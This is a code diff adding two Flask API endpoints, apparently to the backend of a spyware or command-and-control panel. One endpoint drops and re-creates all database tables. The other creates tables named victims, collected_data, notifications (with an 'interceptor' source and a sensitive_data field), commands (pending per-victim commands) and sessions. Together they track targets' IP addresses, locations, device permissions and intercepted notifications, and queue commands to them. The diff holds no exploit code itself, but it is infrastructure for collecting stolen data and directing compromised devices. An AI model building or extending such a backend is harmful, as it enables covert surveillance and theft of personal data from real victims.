@@ -1771,7 +1771,169 @@ def api_notification_details(notification_id):
         log_activity(f"❌ Error in api_notification_details: {e}")
         return jsonify({'error': str(e)}), 500
 
+@app.route('/api/force-init-db', methods=['POST'])
+def api_force_init_db():
+    """Force database initialization"""
+    try:
+        log_activity("🔧 Force initializing database...")
+        
+        # Try to connect and drop all tables
+        conn = sqlite3.connect(DATABASE)
+        cursor = conn.cursor()
+        
+        # Get all table names
+        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
+        tables = cursor.fetchall()
+        
+        # Drop all existing tables
+        for table in tables:
+            try:
+                cursor.execute(f'DROP TABLE IF EXISTS {table[0]}')
+                log_activity(f"🗑️ Dropped table: {table[0]}")
+            except Exception as e:
+                log_activity(f"⚠️ Error dropping {table[0]}: {e}")
+        
+        conn.commit()
+        conn.close()
+        
+        # Now recreate with init_db
+        success = init_db()
+        
+        if success:
+            # Verify tables were created
+            conn = sqlite3.connect(DATABASE)
+            cursor = conn.cursor()
+            cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
+            new_tables = [table[0] for table in cursor.fetchall()]
+            conn.close()
+            
+            log_activity(f"✅ Database recreated with tables: {new_tables}")
+            
+            return jsonify({
+                'status': 'success', 
+                'message': 'Database force initialized',
+                'tables_created': new_tables
+            })
+        else:
+            return jsonify({'status': 'error', 'message': 'Database initialization failed'}), 500
+            
+    except Exception as e:
+        log_activity(f"❌ Error in force init: {e}")
+        traceback.print_exc()
+        return jsonify({'error': str(e)}), 500
 
+@app.route('/api/manual-create-tables', methods=['POST'])
+def api_manual_create_tables():
+    """Manually create all required tables"""
+    try:
+        conn = sqlite3.connect(DATABASE)
+        cursor = conn.cursor()
+        
+        log_activity("🔧 Manually creating tables...")
+        
+        # Create victims table
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS victims (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                victim_id TEXT UNIQUE,
+                session_id TEXT,
+                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                user_agent TEXT,
+                ip_address TEXT,
+                attack_type TEXT,
+                status TEXT DEFAULT 'active',
+                location_lat REAL,
+                location_lng REAL,
+                device_info TEXT,
+                permissions_granted TEXT,
+                notes TEXT
+            )
+        ''')
+        log_activity("✅ Created victims table")
+        
+        # Create collected_data table  
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS collected_data (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                victim_id TEXT,
+                data_type TEXT,
+                data_content TEXT,
+                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                source_url TEXT,
+                severity TEXT DEFAULT 'medium',
+                tags TEXT
+            )
+        ''')
+        log_activity("✅ Created collected_data table")
+        
+        # Create notifications table
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS notifications (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                victim_id TEXT,
+                platform TEXT,
+                category TEXT,
+                title TEXT,
+                body TEXT,
+                notification_data TEXT,
+                analysis_data TEXT,
+                risk_level TEXT DEFAULT 'low',
+                sensitive_data TEXT,
+                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                source TEXT DEFAULT 'interceptor'
+            )
+        ''')
+        log_activity("✅ Created notifications table")
+        
+        # Create commands table
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS commands (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                victim_id TEXT,
+                command_type TEXT,
+                command_data TEXT,
+                status TEXT DEFAULT 'pending',
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                executed_at TIMESTAMP
+            )
+        ''')
+        log_activity("✅ Created commands table")
+        
+        # Create sessions table
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS sessions (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                victim_id TEXT,
+                session_start TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                session_end TIMESTAMP,
+                duration INTEGER,
+                page_views INTEGER DEFAULT 0,
+                actions_performed INTEGER DEFAULT 0
+            )
+        ''')
+        log_activity("✅ Created sessions table")
+        
+        conn.commit()
+        
+        # Verify all tables exist
+        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
+        tables = [table[0] for table in cursor.fetchall()]
+        
+        conn.close()
+        
+        log_activity(f"✅ All tables created: {tables}")
+        
+        return jsonify({
+            'status': 'success',
+            'message': 'All tables created manually',
+            'tables': tables
+        })
+        
+    except Exception as e:
+        log_activity(f"❌ Error creating tables manually: {e}")
+        traceback.print_exc()
+        return jsonify({'error': str(e)}), 500
 @app.route('/api/reset-database', methods=['POST'])
 def api_reset_database():
     """Force database reset"""
